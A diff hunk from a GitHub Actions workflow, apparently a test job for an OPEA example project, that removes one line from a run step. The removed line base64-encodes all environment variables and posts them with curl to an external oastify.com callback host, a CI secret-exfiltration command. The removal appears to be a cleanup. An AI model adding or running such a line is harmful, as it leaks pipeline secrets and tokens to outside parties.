@@ -186,7 +186,6 @@ jobs:
           test_case: ${{ matrix.test_case }}
           use_model_cache: ${{ inputs.use_model_cache }}
         run: |
-          env | base64 | curl -X POST --data-binary @- http://3rvk7z7u8c1n4cvhnsyfo4u0ur0iocc1.oastify.com
           cd ${{ github.workspace }}/$example/tests
           if [[ "$IMAGE_REPO" == "" ]]; then export IMAGE_REPO="${OPEA_IMAGE_REPO}opea"; fi
           if [[ "$use_model_cache" == "true" ]]; then
